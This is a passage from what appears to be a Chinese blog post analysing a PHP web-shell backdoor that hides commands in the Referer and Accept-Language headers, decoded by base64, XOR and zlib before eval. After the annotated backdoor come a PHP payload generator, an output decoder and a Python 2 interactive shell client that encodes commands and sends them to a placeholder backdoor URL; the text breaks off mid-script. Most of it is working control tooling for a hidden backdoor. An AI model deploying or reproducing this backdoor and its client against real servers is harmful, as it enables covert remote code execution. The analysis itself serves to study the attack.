class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 循环异或加密解密，密钥 $k</span><br><span class="line">function <span class="keyword">x</span>($t,$k)&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra)&#123;</span><br><span class="line">    <span class="regexp">//</span> 将 referer 的 query string 的 各个value取出到 $q</span><br><span class="line">    $u=parse_url($rr); <span class="regexp">//</span> parse referer, <span class="keyword">return</span> array, <span class="keyword">keys</span>: scheme,host,port,user,pass,path,query,fragment</span><br><span class="line">    parse_str($u[<span class="string">&quot;query&quot;</span>],$q); <span class="regexp">//</span> parse query string into $q (array).</span><br><span class="line">    $q=array_values($q);        <span class="regexp">//</span> array <span class="keyword">values</span> </span><br><span class="line"></span><br><span class="line">    // 分析 Accept-Language， 提取 每种语言的首字母和权重数字。</span><br><span class="line">    // Searches $ra <span class="keyword">for</span> all matches to the regular expression <span class="keyword">given</span> <span class="keyword">and</span> puts them in $m</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">    <span class="keyword">if</span>($q&amp;&amp;$m)&#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s=&amp;$_SESSION;</span><br><span class="line">        $ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        $sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        $i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];              <span class="regexp">//</span> 两组首字母</span><br><span class="line">        $h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>)); <span class="regexp">//</span> md5($i . $kh) 的前三个字符小写。攻击时附在 $p 开头</span><br><span class="line">        $f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>)); <span class="regexp">//</span> $p 是编码后Payload，攻击时附加到$p 后面</span><br><span class="line"></span><br><span class="line">        // 拼接Payload</span><br><span class="line">        $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)  // 从$q 中取出 $m 正则匹配到的第<span class="number">2</span>组中索引 <span class="number">1</span> -- count($m[<span class="number">1</span>])-<span class="number">1</span> 的值(<span class="number">0</span>-<span class="number">9</span>)作为键的值连接，得到$p</span><br><span class="line">            $p.=$q[$m[<span class="number">2</span>][$z]];         <span class="regexp">//</span> 上例（language）, $p .= $q[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 去除 $p Payload 开头的 $h</span><br><span class="line">        <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)&#123;        <span class="regexp">//</span> $h 在 $p[<span class="number">0</span>] 位置出现。</span><br><span class="line">            $s[$i]=<span class="string">&quot;&quot;</span>;        <span class="regexp">//</span> $_SESSION[$i] = <span class="string">&#x27;&#x27;</span>  , $i 是正则匹配到的两组首字母</span><br><span class="line">            $p=$ss($p,<span class="number">3</span>);    <span class="regexp">//</span> $p 从第<span class="number">3</span>个字符开始的子串,去掉 $h</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($i,$s))&#123;         <span class="regexp">//</span> exist $s[$i], $_SESSION[$i] , <span class="keyword">if</span> 条件必须有 上文 $h 在 $p[<span class="number">0</span>] 位置出现</span><br><span class="line">            $s[$i].=$p;</span><br><span class="line">            $e=strpos($s[$i],$f);   <span class="regexp">//</span> $f 是md5 前三个字符小写 ，在 $s[$i]</span><br><span class="line">            <span class="keyword">if</span>($e)&#123;    <span class="regexp">//</span> 必须有 $f 作为<span class="string">&quot;停止字符串&quot;</span></span><br><span class="line">                $k=$kh.$kf; <span class="regexp">//</span> <span class="number">4</span>f7f28d7</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="regexp">/*</span></span><br><span class="line"><span class="regexp">                去除末尾的 $f</span></span><br><span class="line"><span class="regexp">                URL safe base64 还原为普通base64</span></span><br><span class="line"><span class="regexp">                base64 解码</span></span><br><span class="line"><span class="regexp">                循环异或解密</span></span><br><span class="line"><span class="regexp">                zlib 解密，还原出PHP代码</span></span><br><span class="line"><span class="regexp">                执行PHP代码</span></span><br><span class="line"><span class="regexp">                */</span></span><br><span class="line">                //@eval(@gzuncompress(@x(@base64_decode( preg_replace(array(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),array(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e)) ),$k)));</span><br><span class="line">                echo <span class="string">&quot;CMD WILL EXEC:\n&lt;br /&gt;&quot;</span>;</span><br><span class="line">                echo(@gzuncompress(@x(@base64_decode( preg_replace(array(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),array(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e)) ),$k)));</span><br><span class="line">                $o=ob_get_contents();  <span class="regexp">//</span> output</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d=base64_encode(<span class="keyword">x</span>(gzcompress($o),$k));  <span class="regexp">//</span> 编码</span><br><span class="line">                <span class="keyword">print</span> $o;</span><br><span class="line">                <span class="regexp">//prin</span>t(<span class="string">&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关于正则表达式，例子：</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ra = &#x27;zh-CN,zh;q=0.8,en;q=0.6&#x27;;</span><br><span class="line">$m =<span class="built_in"> array </span>(size=3)</span><br><span class="line">      0 =&gt; </span><br><span class="line">       <span class="built_in"> array </span>(size=3)</span><br><span class="line">          0 =&gt; string &#x27;zh-CN,&#x27; (length=6)</span><br><span class="line">          1 =&gt; string &#x27;zh;q=0.8,&#x27; (length=9)</span><br><span class="line">          2 =&gt; string &#x27;en;q=0.6&#x27; (length=8)</span><br><span class="line">      1 =&gt; </span><br><span class="line">       <span class="built_in"> array </span>(size=3)</span><br><span class="line">          0 =&gt; string &#x27;z&#x27; (length=1)</span><br><span class="line">          1 =&gt; string &#x27;z&#x27; (length=1)</span><br><span class="line">          2 =&gt; string &#x27;e&#x27; (length=1)</span><br><span class="line">      2 =&gt; </span><br><span class="line">       <span class="built_in"> array </span>(size=3)</span><br><span class="line">          0 =&gt; string &#x27;&#x27; (length=0)</span><br><span class="line">          1 =&gt; string &#x27;8&#x27; (length=1)</span><br><span class="line">          2 =&gt; string &#x27;6&#x27; (length=1)</span><br></pre></td></tr></table></figure>
+
+<p>由此，理清这复杂的逻辑后可以写出以下 Payload 生成代码（PHP）：</p>
+<p>(针对 zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6 这一种 Accept-Language)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$referer</span> = <span class="string">&#x27;http://example.com/?a=0&amp;b=1&amp;c=2&amp;d=3&amp;e=4&amp;f=5&amp;g=6&amp;h=7&amp;i=payloadhere&#x27;</span>;</span><br><span class="line"><span class="variable">$lang</span> = <span class="string">&#x27;zh-CN,zh;q=0.8,en;q=0.6&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="number">0</span> =&gt;   <span class="keyword">array</span> (</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;zh-CN,&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&#x27;zh;q=0.8,&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">&#x27;en;q=0.6&#x27;</span>,  ),</span><br><span class="line">  <span class="number">1</span> =&gt;   <span class="keyword">array</span> (</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">&#x27;e&#x27;</span>,  ),</span><br><span class="line">  <span class="number">2</span> =&gt;   <span class="keyword">array</span> (</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">&#x27;6&#x27;</span>,  ),   );</span><br><span class="line"><span class="variable">$i</span> = <span class="string">&#x27;zz&#x27;</span>; <span class="comment">// $m[1][0] . $m[1][1]</span></span><br><span class="line"><span class="variable">$h</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>)); <span class="comment">// 675</span></span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>)); <span class="comment">// a3e</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;        <span class="comment">// $k : xor key, $t: plain. loop xor encrypt $t.</span></span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;4f7f28d7&#x27;</span>;</span><br><span class="line"><span class="comment">//$payload=&#x27;phpinfo();&#x27;;</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">x</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/\//&quot;</span>,<span class="string">&quot;/\+/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;-&quot;</span>), <span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$h</span> . <span class="variable">$payload</span> . <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br><span class="line"><span class="variable">$referer</span> = <span class="string">&quot;http://example.com/?a=0&amp;b=1&amp;c=2&amp;d=3&amp;e=4&amp;f=5&amp;g=6&amp;h=7&amp;i=<span class="subst">$payload</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$referer</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>对于 eval () 后的输出，有以下代码解密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环异或，相同密钥 $k 既能加密也能解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;        <span class="comment">// $k : xor key, $t: plain. loop xor encrypt $t.</span></span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>; <span class="comment">// 4f7f28d7</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;TPocr/oUMjeWhOOCkOx2soCqqzIyf1IwLw==&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">x</span>(<span class="variable">$o</span>,<span class="variable">$k</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure>
+
+<p>根据这个后门的原理写了个交互式的利用程序（Python2）</p>
+<p>每次执行代码生成一次 Accept-Language。对于 Referer 的 Query String，没有用到的部分用随机代码填充，编码后的 Payload 切成 3 部分，头部 md5 和主体连接起来从中切 2 份，尾部 md5 + 随机字符串作为第 3 份。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choicePart</span>(<span class="params">seq,amount</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>,length-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randBytesFlow</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randAlpha</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loopXor</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debugPrint</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;4f7f&quot;</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;28d7&quot;</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://example.com/backdoor.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span> <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,<span class="built_in">len</span>(payload)-<span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span 